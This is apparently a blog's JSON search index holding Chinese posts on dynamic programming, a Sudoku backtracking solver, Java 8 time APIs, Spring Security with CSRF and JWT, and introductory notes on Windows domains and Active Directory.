[{"categories":null,"content":"动态规划问题（Dynamic Programming）应该是很多读者头疼的，不过这类问题也是最具有技巧性，最有意思的。本书使用了整整一个章节专门来写这个算法，动态规划的重要性也可见一斑。 刷题刷多了就会发现，算法技巧就那几个套路，我们后续的动态规划系列章节，都在使用本文的解题框架思维，如果你心里有数，就会轻松很多。所以本文放在第一章，来扒一扒动态规划的裤子，形成一套解决这类问题的思维框架，希望能够成为解决动态规划问题的一部指导方针。本文就来讲解该算法的基本套路框架，下面上干货。 首先，动态规划问题的一般形式就是求最值。动态规划其实是运筹学的一种最优化方法，只不过在计算机问题上应用比较多，比如说让你求最长递增子序列呀，最小编辑距离呀等等。 既然是要求最值，核心问题是什么呢？求解动态规划的核心问题是穷举。因为要求最值，肯定要把所有可行的答案穷举出来，然后在其中找最值呗。 动态规划这么简单，就是穷举就完事了？我看到的动态规划问题都很难啊！ 首先，动态规划的穷举有点特别，因为这类问题存在「重叠子问题」，如果暴力穷举的话效率会极其低下，所以需要「备忘录」或者「DP table」来优化穷举过程，避免不必要的计算。 而且，动态规划问题一定会具备「最优子结构」，才能通过子问题的最值得到原问题的最值。 另外，虽然动态规划的核心思想就是穷举求最值，但是问题可以千变万化，穷举所有可行解其实并不是一件容易的事，只有列出正确的「状态转移方程」才能正确地穷举。 以上提到的重叠子问题、最优子结构、状态转移方程就是动态规划三要素。具体什么意思等会会举例详解，但是在实际的算法问题中，写出状态转移方程是最困难的，这也就是为什么很多朋友觉得动态规划问题困难的原因，我来提供我研究出来的一个思维框架，辅助你思考状态转移方程： 明确 base case -\u003e 明确「状态」-\u003e 明确「选择」 -\u003e 定义 dp 数组/函数的含义。 按上面的套路走，最后的结果就可以套这个框架： # 初始化 base case dp[0][0][...] = base # 进行状态转移 for 状态1 in 状态1的所有取值： for 状态2 in 状态2的所有取值： for ... dp[状态1][状态2][...] = 求最值(选择1，选择2...) 下面通过斐波那契数列问题和凑零钱问题来详解动态规划的基本原理。前者主要是让你明白什么是重叠子问题（斐波那契数列没有求最值，所以严格来说不是动态规划问题），后者主要举集中于如何列出状态转移方程。 ","date":"2021-01-28","objectID":"/2021/01/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/:0:0","tags":null,"title":"动态规划总结","uri":"/2021/01/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"一、斐波那契数列 请读者不要嫌弃这个例子简单，只有简单的例子才能让你把精力充分集中在算法背后的通用思想和技巧上，而不会被那些隐晦的细节问题搞的莫名其妙。想要困难的例子，历史文章里有的是。 1、暴力递归 斐波那契数列的数学形式就是递归的，写成代码就是这样： int fib(int N) { if (N == 1 || N == 2) return 1; return fib(N - 1) + fib(N - 2); } 可以画出递归树，很明显发现了算法低效的原因：存在大量重复计算，比如 f(18) 被计算了两次，而且你可以看到，以 f(18) 为根的这个递归树体量巨大，多算一遍，会耗费巨大的时间。更何况，还不止 f(18) 这一个节点被重复计算，所以这个算法及其低效。 这就是动态规划问题的第一个性质：重叠子问题。下面，我们想办法解决这个问题。 2、带备忘录的递归解法 明确了问题，其实就已经把问题解决了一半。即然耗时的原因是重复计算，那么我们可以造一个「备忘录」，每次算出某个子问题的答案后别急着返回，先记到「备忘录」里再返回；每次遇到一个子问题先去「备忘录」里查一查，如果发现之前已经解决过这个问题了，直接把答案拿出来用，不要再耗时去计算了。 一般使用一个数组充当这个「备忘录」，当然你也可以使用哈希表（字典），思想都是一样的。 int fib(int N) { if (N \u003c 1) return 0; // 备忘录全初始化为 0 vector\u003cint\u003e memo(N + 1, 0); // 进行带备忘录的递归 return helper(memo, N); } int helper(vector\u003cint\u003e\u0026 memo, int n) { // base case if (n == 1 || n == 2) return 1; // 已经计算过 if (memo[n] != 0) return memo[n]; memo[n] = helper(memo, n - 1) + helper(memo, n - 2); return memo[n]; } 实际上，带「备忘录」的递归算法，把一棵存在巨量冗余的递归树通过「剪枝」，改造成了一幅不存在冗余的递归图，极大减少了子问题（即递归图中节点）的个数。 至此，带备忘录的递归解法的效率已经和迭代的动态规划解法一样了。实际上，这种解法和迭代的动态规划已经差不多了，只不过这种方法叫做「自顶向下」，动态规划叫做「自底向上」。 3、dp 数组的迭代解法 有了上一步「备忘录」的启发，我们可以把这个「备忘录」独立出来成为一张表，就叫做 DP table 吧，在这张表上完成「自底向上」的推算岂不美哉！ int fib(int N) { if (N \u003c 1) return 0; if (N == 1 || N == 2) return 1; vector\u003cint\u003e dp(N + 1, 0); // base case dp[1] = dp[2] = 1; for (int i = 3; i \u003c= N; i++) dp[i] = dp[i - 1] + dp[i - 2]; return dp[N]; } 画个图就很好理解了，而且你发现这个 DP table 特别像之前那个「剪枝」后的结果，只是反过来算而已。实际上，带备忘录的递归解法中的「备忘录」，最终完成后就是这个 DP table，所以说这两种解法其实是差不多的，大部分情况下，效率也基本相同。 这里，引出「状态转移方程」这个名词，实际上就是描述问题结构的数学形式： 为啥叫「状态转移方程」？其实就是为了听起来高端。你把 f(n) 想做一个状态 n，这个状态 n 是由状态 n - 1 和状态 n - 2 相加转移而来，这就叫状态转移，仅此而已。 你会发现，上面的几种解法中的所有操作，例如 return f(n - 1) + f(n - 2)，dp[i] = dp[i - 1] + dp[i - 2]，以及对备忘录或 DP table 的初始化操作，都是围绕这个方程式的不同表现形式。可见列出「状态转移方程」的重要性，它是解决问题的核心。而且很容易发现，其实状态转移方程直接代表着暴力解法。 千万不要看不起暴力解，动态规划问题最困难的就是写出这个暴力解，即状态转移方程。只要写出暴力解，优化方法无非是用备忘录或者 DP table，再无奥妙可言。 这个例子的最后，讲一个细节优化。细心的读者会发现，根据斐波那契数列的状态转移方程，当前状态只和之前的两个状态有关，其实并不需要那么长的一个 DP table 来存储所有的状态，只要想办法存储之前的两个状态就行了。所以，可以进一步优化，把空间复杂度降为 O(1)： int fib(int n) { if (n \u003c 1) return 0; if (n == 2 || n == 1) return 1; int prev = 1, curr = 1; for (int i = 3; i \u003c= n; i++) { int sum = prev + curr; prev = curr; curr = sum; } return curr; } 这个技巧就是所谓的「状态压缩」，如果我们发现每次状态转移只需要 DP table 中的一部分，那么可以尝试用状态压缩来缩小 DP table 的大小，只记录必要的数据，上述例子就相当于把DP table 的大小从 n 缩小到 2。后续的动态规划章节中我们还会看到这样的例子，一般来说是把一个二维的 DP table 压缩成一维，即把空间复杂度从 O(n^2) 压缩到 O(n)。 有人会问，动态规划的另一个重要特性「最优子结构」，怎么没有涉及？下面会涉及。斐波那契数列的例子严格来说不算动态规划，因为没有涉及求最值，以上旨在说明重叠子问题的消除方法，演示得到最优解法逐步求精的过程。下面，看第二个例子，凑零钱问题。 ","date":"2021-01-28","objectID":"/2021/01/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/:1:0","tags":null,"title":"动态规划总结","uri":"/2021/01/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"二、凑零钱问题 先看下题目：给你 k 种面值的硬币，面值分别为 c1, c2 … ck，每种硬币的数量无限，再给一个总金额 amount，问你最少需要几枚硬币凑出这个金额，如果不可能凑出，算法返回 -1 。算法的函数签名如下： // coins 中是可选硬币面值，amount 是目标金额 int coinChange(int[] coins, int amount); 如说 k = 3，面值分别为 1，2，5，总金额 amount = 11。那么最少需要 3 枚硬币凑出，即 11 = 5 + 5 + 1。 你认为计算机应该如何解决这个问题？显然，就是把所有可能的凑硬币方法都穷举出来，然后找找看最少需要多少枚硬币。 1、暴力递归 首先，这个问题是动态规划问题，因为它具有「最优子结构」的。要符合「最优子结构」，子问题间必须互相独立。啥叫相互独立？你肯定不想看数学证明，我用一个直观的例子来讲解。 比如说，假设你考试，每门科目的成绩都是互相独立的。你的原问题是考出最高的总成绩，那么你的子问题就是要把语文考到最高，数学考到最高…… 为了每门课考到最高，你要把每门课相应的选择题分数拿到最高，填空题分数拿到最高…… 当然，最终就是你每门课都是满分，这就是最高的总成绩。 得到了正确的结果：最高的总成绩就是总分。因为这个过程符合最优子结构，“每门科目考到最高”这些子问题是互相独立，互不干扰的。 但是，如果加一个条件：你的语文成绩和数学成绩会互相制约，数学分数高，语文分数就会降低，反之亦然。这样的话，显然你能考到的最高总成绩就达不到总分了，按刚才那个思路就会得到错误的结果。因为子问题并不独立，语文数学成绩无法同时最优，所以最优子结构被破坏。 回到凑零钱问题，为什么说它符合最优子结构呢？比如你想求 amount = 11 时的最少硬币数（原问题），如果你知道凑出 amount = 10 的最少硬币数（子问题），你只需要把子问题的答案加一（再选一枚面值为 1 的硬币）就是原问题的答案。因为硬币的数量是没有限制的，所以子问题之间没有相互制，是互相独立的。 PS：关于最优子结构的问题，后文动态规划答疑篇 还会再举例探讨。 那么，既然知道了这是个动态规划问题，就要思考如何列出正确的状态转移方程？ 1、确定 base case，这个很简单，显然目标金额 amount 为 0 时算法返回 0，因为不需要任何硬币就已经凑出目标金额了。 2、确定「状态」，也就是原问题和子问题中会变化的变量。由于硬币数量无限，硬币的面额也是题目给定的，只有目标金额会不断地向 base case 靠近，所以唯一的「状态」就是目标金额 amount。 3、确定「选择」，也就是导致「状态」产生变化的行为。目标金额为什么变化呢，因为你在选择硬币，你每选择一枚硬币，就相当于减少了目标金额。所以说所有硬币的面值，就是你的「选择」。 4、明确 dp 函数/数组的定义。我们这里讲的是自顶向下的解法，所以会有一个递归的 dp 函数，一般来说函数的参数就是状态转移中会变化的量，也就是上面说到的「状态」；函数的返回值就是题目要求我们计算的量。就本题来说，状态只有一个，即「目标金额」，题目要求我们计算凑出目标金额所需的最少硬币数量。所以我们可以这样定义 dp 函数： dp(n) 的定义：输入一个目标金额 n，返回凑出目标金额 n 的最少硬币数量。 搞清楚上面这几个关键点，解法的伪码就可以写出来了： # 伪码框架 def coinChange(coins: List[int], amount: int): # 定义：要凑出金额 n，至少要 dp(n) 个硬币 def dp(n): # 做选择，选择需要硬币最少的那个结果 for coin in coins: res = min(res, 1 + dp(n - coin)) return res # 题目要求的最终结果是 dp(amount) return dp(amount) 根据伪码，我们加上 base case 即可得到最终的答案。显然目标金额为 0 时，所需硬币数量为 0；当目标金额小于 0 时，无解，返回 -1： def coinChange(coins: List[int], amount: int): def dp(n): # base case if n == 0: return 0 if n \u003c 0: return -1 # 求最小值，所以初始化为正无穷 res = float('INF') for coin in coins: subproblem = dp(n - coin) # 子问题无解，跳过 if subproblem == -1: continue res = min(res, 1 + subproblem) return res if res != float('INF') else -1 return dp(amount) 递归算法的时间复杂度分析：子问题总数 x 每个子问题的时间。 子问题总数为递归树节点个数，这个比较难看出来，是 O(n^k)，总之是指数级别的。每个子问题中含有一个 for 循环，复杂度为 O(k)。所以总时间复杂度为 O(k * n^k)，指数级别。 2、带备忘录的递归 类似之前斐波那契数列的例子，只需要稍加修改，就可以通过备忘录消除子问题： def coinChange(coins: List[int], amount: int): # 备忘录 memo = dict() def dp(n): # 查备忘录，避免重复计算 if n in memo: return memo[n] # base case if n == 0: return 0 if n \u003c 0: return -1 res = float('INF') for coin in coins: subproblem = dp(n - coin) if subproblem == -1: continue res = min(res, 1 + subproblem) # 记入备忘录 memo[n] = res if res != float('INF') else -1 return memo[n] return dp(amount) 3、dp 数组的迭代解法 当然，我们也可以自底向上使用 dp table 来消除重叠子问题，关于「状态」「选择」和 base case 与之前没有区别，dp 数组的定义和刚才 dp 函数类似，也是把「状态」，也就是目标金额作为变量。不过 dp 函数体现在函数参数，而 dp 数组体现在数组索引： dp 数组的定义：当目标金额为 i 时，至少需要 dp[i] 枚硬币凑出。 根据我们文章开头给出的动态规划代码框架可以写出如下解法： int coinChange(vector\u003cint\u003e\u0026 coins, int amount) { // 数组大小为 amount + 1，初始值也为 amount + 1 vector\u003cint\u003e dp(amount + 1, amount + 1); // base case dp[0] = 0; // 外层 for 循环在遍历所有状态的所有取值 for (int i = 0; i \u003c dp.size(); i++) { // 内层 for 循环在求所有选择的最小值 for (int coin : coins) { // 子问题无解，跳过 if (i - coin \u003c 0) continue; dp[i] = min(dp[i], 1 + dp[i - coin]); } } return (dp[amount] == amount + 1) ? -1 : dp[amount]; } PS：为啥 dp 数组初始化为 amount + 1 呢，因为凑成 amount 金额的硬币数最多只可能等于 amount（全用 1 元面值的硬币），所以初始化为 amount + 1 就相当于初始化为正无穷，便于后续取最小值。 ","date":"2021-01-28","objectID":"/2021/01/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/:2:0","tags":null,"title":"动态规划总结","uri":"/2021/01/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"三、最后总结 第一个斐波那契数列的问题，解释了如何通过「备忘录」或者「dp table」的方法来优化递归树，并且明确了这两种方法本质上是一样的，只是自顶向下和自底向上的不同而已。 第二个凑零钱的问题，展示了如何流程化确定「状态转移方程」，只要通过状态转移方程写出暴力递归解，剩下的也就是优化递归树，消除重叠子问题而已。 如果你不太了解动态规划，还能看到这里，真得给你鼓掌，相信你已经掌握了这个算法的设计技巧。 计算机解决问题其实没有任何奇技淫巧，它唯一的解决办法就是穷举，穷举所有可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明地穷举”。 列出动态转移方程，就是在解决“如何穷举”的问题。之所以说它难，一是因为很多穷举需要递归实现，二是因为有的问题本身的解空间复杂，不那么容易穷举完整。 备忘录、DP table 就是在追求“如何聪明地穷举”。用空间换时间的思路，是降低时间复杂度的不二法门，除此之外，试问，还能玩出啥花活？ ","date":"2021-01-28","objectID":"/2021/01/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/:3:0","tags":null,"title":"动态规划总结","uri":"/2021/01/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"数独游戏 今天看到一个比较游戏以的题目，就是数独游戏。 先说一下数独的规则： 数字 1-9 在每一行只能出现一次。 数字 1-9 在每一列只能出现一次。 数字 1-9 在每一个以粗实线分隔的 3x3 宫内只能出现一次。 如： 一个解： 题目给的形式如下： public void solveSudoku(char[][] board) { } 有如下规定： 给定的数独序列只包含数字 1-9 和字符 ‘.’ 。 你可以假设给定的数独只有唯一解。 给定数独永远是 9x9 形式的。 首先看到题目，只需求一个解就行了，像这种数独游戏无非就是暴力寻找，立马可以想到用回溯法。 public void solveSudoku(char[][] board) { backtrace(board, 0, 0); } //从r行c列开始往下找是否有解 public boolean backtrace(char[][] board, int r, int c) { //找到解，直接返回 if (r == 9) return true; //到下一行 if (c == 9) { return backtrace(board, r + 1, 0); } //选择 for (char k = '1'; k \u003c= '9'; k++) { //有数字，就直接往下一个 if (board[r][c] != '.') { return backtrace(board, r, c + 1); } if (!valid(board, r, c, k)) continue; //做选择 board[r][c] = k; if (backtrace(board, r, c + 1)) { return true; } //取消选择 board[r][c] = '.'; } return false; } valid函数就是看适合合法了： public boolean valid(char[][] board, int r, int c, int ch) { for (int i = 0; i \u003c 9; i++) { //看当前列是否合法 if (board[i][c] == ch) return false; //看当前行是否合法 if (board[r][i] == ch) return false; //看周围 3x3 宫内是否合法 if (board[(r / 3) * 3 + i / 3][(c / 3) * 3 + i % 3] == ch) return false; } return true; } 好了，这就是全部了～题目虽然不是很难，但小时候玩过的游戏，现在用程序解决有不一样的乐趣～ ","date":"2021-01-27","objectID":"/2021/01/%E6%95%B0%E7%8B%AC%E6%B8%B8%E6%88%8F/:0:0","tags":null,"title":"数独游戏","uri":"/2021/01/%E6%95%B0%E7%8B%AC%E6%B8%B8%E6%88%8F/"},{"categories":null,"content":"LocalDate 和 LocalTime 首先不附带任何与时区相关的信息。 LocalDate.of(2020,1,1); LocalDate.parse(\"2020-01-01\") LocalDate.now() ","date":"2020-12-17","objectID":"/2020/12/java8%E6%97%B6%E9%97%B4/:1:0","tags":null,"title":"Java8时间","uri":"/2020/12/java8%E6%97%B6%E9%97%B4/"},{"categories":null,"content":"Instant 以 Unix 元年(1970.1.1)开始所经历的秒数。设计初衷是为了便于机器使用。 Instant.ofEpochSecond(3,1)//3是秒,1是納秒 Instant.now() ","date":"2020-12-17","objectID":"/2020/12/java8%E6%97%B6%E9%97%B4/:2:0","tags":null,"title":"Java8时间","uri":"/2020/12/java8%E6%97%B6%E9%97%B4/"},{"categories":null,"content":"Duration 或 Period Duration 以秒和納秒为单位建模 Period 以以年月日为单位建模 ","date":"2020-12-17","objectID":"/2020/12/java8%E6%97%B6%E9%97%B4/:3:0","tags":null,"title":"Java8时间","uri":"/2020/12/java8%E6%97%B6%E9%97%B4/"},{"categories":null,"content":"时区 ZoneId 取代 TimeZone Instant 和 LocalDateTime 可以通过 ZoneId 互相转换 ZoneOffset 是 ZoneId 一个子类，表示时区固定偏差。这种方式未考虑夏令时的影响，不推荐使用。 ","date":"2020-12-17","objectID":"/2020/12/java8%E6%97%B6%E9%97%B4/:4:0","tags":null,"title":"Java8时间","uri":"/2020/12/java8%E6%97%B6%E9%97%B4/"},{"categories":null,"content":"4 种授权模式： ","date":"2020-11-27","objectID":"/2020/11/spring-security%E6%95%99%E7%A8%8B/:1:0","tags":null,"title":"Spring Security教程","uri":"/2020/11/spring-security%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"1.授权码模式 将用户引导到授权服务器进行身份认证，授权服务器将发放的访问令牌传递给客户端。 授权码的客户端指接入 OAuth 的第三方应用。 ","date":"2020-11-27","objectID":"/2020/11/spring-security%E6%95%99%E7%A8%8B/:1:1","tags":null,"title":"Spring Security教程","uri":"/2020/11/spring-security%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"会话管理 要使用会话管理功能，就应该同时配置 HttpSessionEventPublisher @Bean public HttpSessionEventPublisher httpSessionEventPublisher(){ return new HttpSessionEventPublisher(); } 并且要为自定义用户类覆写 hashCode 和 equals 两个方法 ","date":"2020-11-27","objectID":"/2020/11/spring-security%E6%95%99%E7%A8%8B/:2:0","tags":null,"title":"Spring Security教程","uri":"/2020/11/spring-security%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"CSRF 防御手段 在任何情况下，都应尽可能避免以 GET 方式提供涉及数据修改的 API 防御 CSRF 工具的方式主要有一下两种： HTTP Referer：判断请求来源，拒绝其他站点的请求。可修改，不可靠。 CsrfToken 认证：添加一些并不存在于 cookie 的验证值，并在每个请求中验证。 ","date":"2020-11-27","objectID":"/2020/11/spring-security%E6%95%99%E7%A8%8B/:3:0","tags":null,"title":"Spring Security教程","uri":"/2020/11/spring-security%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"使用 Spring Security 防御 CSRF 攻击 默认用一个 HttpSessionCsrfTokenRepository 将 CsrfToken 存储在 HttpSession 中，指定前端把 CsrfToken 放在名为_csrf的请求参数或名为X-CSRF-TOKEN的请求头字段里。校验时通过判断是否一致。 在单页应用中用 CookieCsrfTokenRe。它将 CsrfToken 值存储在用户的 cookie 内（要设置 httponly 为 false）。前端用 Js 读取，放在请求参数或请求头中。 现已默认使用 LazyCsrfTokenRepository 来包裹 HttpSessionCsrfTokenRepository ","date":"2020-11-27","objectID":"/2020/11/spring-security%E6%95%99%E7%A8%8B/:4:0","tags":null,"title":"Spring Security教程","uri":"/2020/11/spring-security%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"内网渗透测试基础 ","date":"2020-11-02","objectID":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/:0:0","tags":null,"title":"内网安全攻防手册笔记","uri":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"内网基础知识 ","date":"2020-11-02","objectID":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/:1:0","tags":null,"title":"内网安全攻防手册笔记","uri":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"工作组 将不同计算机按功能（或部门）分别列入不同的工作组。同一工作组可以互相访问共享资源，工作组内的机器都是对等的。 ","date":"2020-11-02","objectID":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/:1:1","tags":null,"title":"内网安全攻防手册笔记","uri":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"域 域是一个有安全边界的计算机集合。（安全边界的意思是，在两个域中，一个域的用户无法访问另一个域中的资源）。可以理解为升级版的工作组，想要访问域中资源，需要登陆域。互用拥有什么样的权限取决于用户的身份。 域控制器（DC）是域中一台类似管理服务器的计算机，可以理解为门禁系统。负责所有连入的计算机和用户的验证工作。域内计算机如果想互相访问，都需要经过域控制器的审核。 域中一般有如下几个环境： 单域 在一个域中，一般要至少两台服务器，一台 DC,一台作为备份 DC 父域和子域 域树 指多个域通过建立信任关系组成的集合。 域的名字是连续的，如 abc.com（父域） \u003c- asia.abc.com（子域） 域森林 指多个域树通过建立信任关系组成的集合。 域名服务器 DNS，域名和 IP 地址转换 ","date":"2020-11-02","objectID":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/:1:2","tags":null,"title":"内网安全攻防手册笔记","uri":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"活动目录 指域环境中提供目录服务的组件。理解为字典索引。 ","date":"2020-11-02","objectID":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/:1:3","tags":null,"title":"内网安全攻防手册笔记","uri":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"域控制器和活动目录的区别 把网络中的众多对象放在一个大仓库中，并将检索信息整理好，一边查找、管理和使用这些对象（资源）。这个拥有层次结构的数据库，就是活动目录数据库，简称 AD 库。 要实现域环境，就是要安装 AD。如果一台计算机安装了 AD,它就成了 DC（用于存储活动目录数据库的计算机）。 ","date":"2020-11-02","objectID":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/:1:4","tags":null,"title":"内网安全攻防手册笔记","uri":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"安全域的划分 划分安全域的目的是将一组安全等级相同的计算机划入同意个网段。 DMZ 称为隔离区，是为了解决安装防火墙后外部网络不能访问内部网络服务器问题而建立的一个非安全系统与安全系统之间的缓冲区。 ","date":"2020-11-02","objectID":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/:1:5","tags":null,"title":"内网安全攻防手册笔记","uri":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"域中计算机的分类 域控制器 管理所有的网络访问。可以有多台域控制器（高可用）。 成员服务器 安装了服务器操作系统并加入域，但没有安装活动目录的计算机，提供网络资源 客户机 安装了其他操作系统的计算机，用户利用这些计算机和域中的账户就可以登陆域。 独立服务器 既不加入域，也不安装活动目录的计算机。不能使用活动目录提供的任何服务。 域控制器必须要有，其他三种不需要。 ","date":"2020-11-02","objectID":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/:1:6","tags":null,"title":"内网安全攻防手册笔记","uri":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"域权限解读 组是用户帐号的集合。 域本地组 全局组 通用组 A-G-DL-P 策略 域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林。 ","date":"2020-11-02","objectID":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/:1:7","tags":null,"title":"内网安全攻防手册笔记","uri":"/2020/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%89%8B%E5%86%8C%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"大体思路： ","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:1:0","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"登入： POST 用户名密码到 \\login 请求到达 JwtAuthenticationFilter 中的 attemptAuthentication() 方法，获取 request 中的 POST 参数，包装成一个 UsernamePasswordAuthenticationToken 交付给 AuthenticationManager 的 authenticate() 方法进行鉴权。 AuthenticationManager 会从 CachingUserDetailsService 中查找用户信息，并且判断账号密码是否正确。 如果账号密码正确跳转到 JwtAuthenticationFilter 中的 successfulAuthentication() 方法，我们进行签名，生成 token 返回给用户。 账号密码错误则跳转到 JwtAuthenticationFilter 中的 unsuccessfulAuthentication() 方法，我们返回错误信息让用户重新登入。 ","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:1:1","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"请求鉴权： 请求鉴权的主要思路是我们会从请求中的 Authorization 字段拿取 token，如果不存在此字段的用户，Spring Security 会默认会用 AnonymousAuthenticationToken() 包装它，即代表匿名用户。 任意请求发起 到达 JwtAuthorizationFilter 中的 doFilterInternal() 方法，进行鉴权。 如果鉴权成功我们把生成的 Authentication 用 SecurityContextHolder.getContext().setAuthentication() 放入 Security，即代表鉴权完成。此处如何鉴权由我们自己代码编写，后序会详细说明。 ","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:1:2","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"JWT 的组成 JWT token 的格式：header.payload.signature header 中用于存放签名的生成算法 {\"alg\": \"HS512\"} payload 中用于存放用户名、token 的生成时间和过期时间 {\"sub\":\"admin\",\"created\":1489079981393,\"exp\":1489684781} signature 为以 header 和 payload 生成的签名，一旦 header 和 payload 被篡改，验证将失败 //secret 为加密算法的密钥 String signature = HMACSHA512(base64UrlEncode(header) + \".\" +base64UrlEncode(payload),secret) ","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:2:0","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"JWT 实例 eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImNyZWF0ZWQiOjE1NTY3NzkxMjUzMDksImV4cCI6MTU1NzM4MzkyNX0.d-iki0193X0bBOETf2UN3r3PotNIEAV7mzIxxeI5IxFyzzkOZxS0PGfF_SK6wxCv2K8S0cZjMkv6b5bCqc0VBw ","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:3:0","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"JWT 实现认证和授权的原理 用户调用登录接口，登录成功后获取到 JWT 的 token； 之后用户每次调用接口都在 http 的 header 中添加一个叫 Authorization 的头，值为 JWT 的 token； 后台程序通过对 Authorization 头中信息的解码及数字签名校验来获取其中的用户信息，从而实现认证和授权。 ","date":"2020-10-27","objectID":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/:4:0","tags":null,"title":"Spring Security整合JWT教程","uri":"/2020/10/spring-security%E6%95%B4%E5%90%88jwt%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"pom 依赖 \u003cdependency\u003e \u003cgroupId\u003ecom.nimbusds\u003c/groupId\u003e \u003cartifactId\u003enimbus-jose-jwt\u003c/artifactId\u003e \u003cversion\u003e9.1\u003c/version\u003e \u003c/dependency\u003e 